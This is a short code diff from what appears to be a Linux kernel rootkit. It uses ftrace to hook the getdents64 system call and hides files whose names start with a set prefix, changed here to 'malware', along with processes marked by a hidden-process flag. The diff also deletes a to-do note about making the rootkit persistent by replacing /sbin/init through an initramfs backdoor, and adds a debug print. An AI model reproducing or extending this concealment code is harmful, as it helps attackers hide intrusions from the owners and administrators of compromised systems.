@@ -1,6 +1,6 @@
 #include "ftrace_helper.h"
 
-#define PREFIX "seal_"
+#define PREFIX "malware"
 #define INVIS 0x10000000
 
 /// Enable debug prints
@@ -29,11 +29,6 @@ void debug_print(char *msg) {
     if (DEBUG) { printk(KERN_INFO "%s", msg); }
 }
 
-/* TODO
-   3. persistence
-    replacee /sbin/init
-    https://yassine.tioual.com/posts/backdoor-initramfs-and-make-your-rootkit-persistent/
-*/
 
 /// Find a process in the process list
 struct task_struct *find_task(pid_t pid) {
@@ -70,6 +65,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs) {
 
     while (offset < ret) {
         current_dir = (void *)dirent_ker + offset;
+	debug_print(current_dir->d_name);
 
         if ((memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) ||
         check_invis(simple_strtoul(current_dir->d_name, NULL, 10))) {
